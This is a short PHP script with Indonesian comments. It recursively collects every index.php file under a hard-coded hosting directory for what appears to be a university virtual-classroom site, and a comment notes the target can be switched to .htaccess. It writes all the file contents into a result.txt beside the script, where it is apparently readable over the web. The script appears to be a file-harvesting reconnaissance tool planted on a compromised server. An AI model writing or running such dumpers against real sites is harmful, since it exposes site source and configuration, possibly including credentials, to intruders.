<?php
$baseDir = "/home/ulasalle/public_html/aulavirtual"; 
$outputFile = __DIR__ . "/result.txt";
$targetFile = "index.php"; // bisa diganti ".htaccess" atau lainnya

$iterator = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($baseDir, FilesystemIterator::SKIP_DOTS)
);

$fh = fopen($outputFile, "w");

foreach ($iterator as $file) {
    if ($file->getFilename() === $targetFile) {
        $path = $file->getPathname();
        fwrite($fh, "===== $path =====\n");

        $content = @file_get_contents($path);
        if ($content !== false) {
            fwrite($fh, $content . "\n\n");
        } else {
            fwrite($fh, "[Tidak bisa membaca file]\n\n");
        }
    }
}

fclose($fh);

echo "Selesai! Hasil tersimpan di: $outputFile\n";
